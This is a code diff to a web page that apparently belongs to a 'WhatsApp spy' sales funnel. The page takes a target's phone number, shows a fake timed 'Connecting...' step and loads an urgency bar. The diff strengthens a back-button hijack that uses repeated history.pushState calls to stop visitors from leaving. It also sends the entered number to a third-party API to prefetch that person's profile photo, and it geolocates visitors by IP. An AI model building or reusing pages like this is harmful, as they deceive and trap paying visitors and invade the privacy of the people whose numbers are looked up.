@@ -65,7 +65,7 @@ function navigateWithQuery(targetUrl, params) {
 }
 // End query forwarding helper
 </script>
-<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);setTimeout(b,200);window.onpopstate=function(){navigateWithQuery("backredirect.html");};}());</script>
+<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);setTimeout(b,200);window.onpopstate=function(){/* block back — offer only on last step */b();};}());</script>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 :root{--green:#25D366;--green-dark:#128C7E;--bg:#f0f2f5;--white:#fff;--text:#111b21;--text2:#667781;--border:#e9edef;--red:#ef4444;--shadow-lg:0 8px 32px rgba(0,0,0,.12);}
@@ -89,11 +89,12 @@ body{font-family:'Inter',sans-serif;background:var(--bg);min-height:100vh;displa
 
 /* Phone row */
 .phone-row{display:flex;gap:.6rem;margin-bottom:.4rem;}
-.country-btn{display:flex;align-items:center;gap:.4rem;background:var(--bg);border:1.5px solid var(--border);border-radius:11px;padding:0 .65rem;min-width:90px;cursor:pointer;transition:border-color .2s;position:relative;height:50px;}
+.country-btn{display:flex;align-items:center;gap:.35rem;background:var(--bg);border:1.5px solid var(--border);border-radius:11px;padding:0 .7rem;min-width:108px;cursor:pointer;transition:border-color .2s;position:relative;height:50px;flex-shrink:0;}
 .country-btn:hover{border-color:var(--green);}
-.flag{font-size:1.2rem;pointer-events:none;}
+.flag{width:22px;height:16px;border-radius:2px;object-fit:cover;pointer-events:none;flex-shrink:0;box-shadow:0 0 0 1px rgba(0,0,0,.08);background:#e9edef;display:block;}
 .cc{font-size:.85rem;font-weight:600;color:var(--text);pointer-events:none;white-space:nowrap;}
 .country-btn select{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;font-size:1rem;}
+.caret{pointer-events:none;display:flex;align-items:center;}
 .caret svg{width:12px;height:12px;stroke:var(--text2);fill:none;stroke-width:2;}
 .phone-inp{flex:1;background:var(--bg);border:1.5px solid var(--border);border-radius:11px;padding:.82rem 1rem;color:var(--text);font-family:'Inter',sans-serif;font-size:.95rem;font-weight:500;outline:none;transition:border-color .2s;height:50px;}
 .phone-inp::placeholder{color:var(--text2);font-weight:400;}
@@ -113,6 +114,8 @@ body{font-family:'Inter',sans-serif;background:var(--bg);min-height:100vh;displa
 .det-spin{width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;}
 @keyframes spin{to{transform:rotate(360deg)}}
 </style>
+<script src="js/profile-photo.js"></script>
+<script src="js/urgency-bar.js"></script>
 </head>
 <body>
 <div class="wrap">
@@ -133,7 +136,7 @@ body{font-family:'Inter',sans-serif;background:var(--bg);min-height:100vh;displa
     <div id="detecting-row" class="detecting"><div class="det-spin"></div>Detecting your location...</div>
     <div class="phone-row">
       <div class="country-btn" id="cbtn">
-        <span class="flag" id="sel-flag">🌐</span>
+        <img class="flag" id="sel-flag" src="https://flagcdn.com/w40/us.png" alt="" width="22" height="16">
         <span class="cc" id="sel-code">+1</span>
         <select id="csel" onchange="onCountryChange()"></select>
         <div class="caret"><svg viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg></div>
@@ -258,55 +261,159 @@ var countries = [
 
 // Map country code ISO → index
 var isoMap = {};
-countries.forEach(function(c,i){ isoMap[c.iso] = i; });
+function rebuildIsoMap() {
+  isoMap = {};
+  countries.forEach(function(c,i){ isoMap[c.iso] = i; });
+}
+rebuildIsoMap();
 
 var current = countries[0];
 
 function buildSelect() {
   var sel = document.getElementById('csel');
+  sel.innerHTML = '';
   countries.forEach(function(c,i){
     var o = document.createElement('option');
-    o.value = i; o.textContent = c.flag+' '+c.name+' ('+c.code+')';
+    o.value = i; o.textContent = c.name + ' (' + c.code + ')';
     sel.appendChild(o);
   });
 }
 
-function setCountry(iso) {
-  var idx = isoMap[iso];
-  if (idx === undefined) idx = 0;
-  current = countries[idx];
-  document.getElementById('sel-flag').textContent = current.flag;
+function flagUrl(iso) {
+  // PNG flag image — works on Windows (emoji flags often show as "BR"/"US" text)
+  return 'https://flagcdn.com/w40/' + String(iso || 'us').toLowerCase() + '.png';
+}
+
+function renderCountryBtn() {
+  var flagEl = document.getElementById('sel-flag');
+  flagEl.src = flagUrl(current.iso);
+  flagEl.alt = current.iso;
+  // Only dial code once: 🇧🇷 image + "+55"
   document.getElementById('sel-code').textContent = current.code;
-  document.getElementById('csel').value = idx;
+  document.getElementById('csel').value = String(isoMap[current.iso] !== undefined ? isoMap[current.iso] : 0);
   updateHint();
+}
+
+/** Put country first in the list and select it */
+function prioritizeCountry(iso) {
+  if (!iso) return false;
+  iso = String(iso).toUpperCase();
+  var idx = isoMap[iso];
+  if (idx === undefined) return false;
+
+  if (idx > 0) {
+    var item = countries.splice(idx, 1)[0];
+    countries.unshift(item);
+    rebuildIsoMap();
+    buildSelect();
+  }
+
+  current = countries[0];
+  renderCountryBtn();
+  return true;
+}
+
+function setCountry(iso) {
+  if (!prioritizeCountry(iso)) {
+    // Unknown ISO — keep list order, select first
+    current = countries[0];
+    renderCountryBtn();
+  }
 }
 
 function onCountryChange() {
-  var idx = parseInt(document.getElementById('csel').value);
+  var idx = parseInt(document.getElementById('csel').value, 10);
   current = countries[idx];
-  document.getElementById('sel-flag').textContent = current.flag;
-  document.getElementById('sel-code').textContent = current.code;
+  renderCountryBtn();
   document.getElementById('phone-inp').value = '';
-  updateHint();
 }
 
 function updateHint() {
-  var hints = {US:'E.g.: (555) 123-4567',BR:'E.g.: (11) 99999-9999',MX:'E.g.: (55) 1234-5678'};
-  document.getElementById('hint').textContent = hints[current.iso] || 'E.g.: +X XXX XXX XXXX';
+  var hints = {
+    US:'E.g.: (555) 123-4567',
+    CA:'E.g.: (416) 555-1234',
+    BR:'E.g.: (11) 99999-9999',
+    MX:'E.g.: (55) 1234-5678',
+    GB:'E.g.: 7400 123456',
+    PT:'E.g.: 912 345 678',
+    ES:'E.g.: 612 34 56 78',
+    AR:'E.g.: (11) 15-1234-5678',
+    DE:'E.g.: 1512 3456789',
+    FR:'E.g.: 6 12 34 56 78'
+  };
+  document.getElementById('hint').textContent = hints[current.iso] || ('E.g.: ' + current.code + ' ...');
 }
 
-// Auto-detect country by IP
+function hideDetecting() {
+  var row = document.getElementById('detecting-row');
+  if (row) row.style.display = 'none';
+}
+
+/** Browser language fallback (pt-BR → BR, en-US → US, etc.) */
+function localeCountryGuess() {
+  try {
+    var lang = (navigator.language || navigator.userLanguage || '').toUpperCase();
+    var m = lang.match(/[-_]([A-Z]{2})$/);
+    if (m && isoMap[m[1]] !== undefined) return m[1];
+    // language-only heuristics
+    var map = {PT:'BR', ES:'ES', FR:'FR', DE:'DE', IT:'IT', JA:'JP', KO:'KR', ZH:'CN', HI:'IN', AR:'SA', RU:'RU', NL:'NL', PL:'PL', TR:'TR'};
+    var base = lang.split(/[-_]/)[0];
+    if (map[base] && isoMap[map[base]] !== undefined) return map[base];
+  } catch (e) {}
+  return null;
+}
+
+function fetchJson(url, timeoutMs) {
+  timeoutMs = timeoutMs || 4000;
+  return new Promise(function(resolve, reject) {
+    var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
+    var t = setTimeout(function() {
+      if (ctrl) ctrl.abort();
+      reject(new Error('timeout'));
+    }, timeoutMs);
+    fetch(url, { signal: ctrl ? ctrl.signal : undefined, cache: 'no-store' })
+      .then(function(r) {
+        if (!r.ok) throw new Error('http ' + r.status);
+        return r.json();
+      })
+      .then(function(d) { clearTimeout(t); resolve(d); })
+      .catch(function(e) { clearTimeout(t); reject(e); });
+  });
+}
+
+// Auto-detect country by IP (several free APIs + fallbacks)
 function detectCountry() {
-  fetch('https://ipapi.co/json/')
-    .then(function(r){ return r.json(); })
-    .then(function(d){
-      if (d && d.country_code) setCountry(d.country_code);
-      document.getElementById('detecting-row').style.display = 'none';
-    })
-    .catch(function(){
-      setCountry('US');
-      document.getElementById('detecting-row').style.display = 'none';
-    });
+  var sources = [
+    // { url, pick(data) → ISO2 }
+    { url: 'https://ipapi.co/json/', pick: function(d){ return d && (d.country_code || d.country); } },
+    { url: 'https://ipwho.is/', pick: function(d){ return d && d.success !== false && d.country_code; } },
+    { url: 'https://api.country.is/', pick: function(d){ return d && d.country; } },
+    { url: 'https://get.geojs.io/v1/ip/country.json', pick: function(d){ return d && d.country; } }
+  ];
+
+  function tryNext(i) {
+    if (i >= sources.length) {
+      // Fallbacks when all IP APIs fail
+      var guess = localeCountryGuess();
+      if (guess) prioritizeCountry(guess);
+      else setCountry('US');
+      hideDetecting();
+      return;
+    }
+    var src = sources[i];
+    fetchJson(src.url, 3500)
+      .then(function(d) {
+        var iso = src.pick(d);
+        if (iso && prioritizeCountry(iso)) {
+          hideDetecting();
+          return;
+        }
+        tryNext(i + 1);
+      })
+      .catch(function(){ tryNext(i + 1); });
+  }
+
+  tryNext(0);
 }
 
 function fmtPhone(input) {
@@ -337,16 +444,39 @@ function startSpy() {
   var full = current.code + ' ' + document.getElementById('phone-inp').value;
   sessionStorage.setItem('sl_phone', full);
 
+  // Keep gender from step 1
+  var g = new URLSearchParams(window.location.search).get('gender') || sessionStorage.getItem('sl_gender') || '';
+  if (g) {
+    try { sessionStorage.setItem('sl_gender', g); } catch (e) {}
+  }
+
+  // Prefetch WhatsApp profile photo (Auralink API) while connecting
+  var dig = (current.code + raw).replace(/\D/g, '');
+  try {
+    if (window.ProfilePhoto) ProfilePhoto.prefetch(dig);
+  } catch (e) {}
+
   var btn = document.getElementById('spy-btn');
   btn.innerHTML = '<div style="width:18px;height:18px;border:2.5px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;flex-shrink:0;"></div> Connecting...';
   btn.disabled = true;
 
   setTimeout(function(){
-    navigateWithQuery('step3.html', {phone: full});
+    var params = { phone: full };
+    if (g) params.gender = g;
+    navigateWithQuery('step3.html', params);
   }, 1200);
 }
 
+// Persist gender if arriving from step 1
+(function(){
+  var g = new URLSearchParams(window.location.search).get('gender');
+  if (g) {
+    try { sessionStorage.setItem('sl_gender', g); } catch (e) {}
+  }
+})();
+
 buildSelect();
+renderCountryBtn(); // temporary default until IP resolves
 detectCountry();
 </script>
 </body>
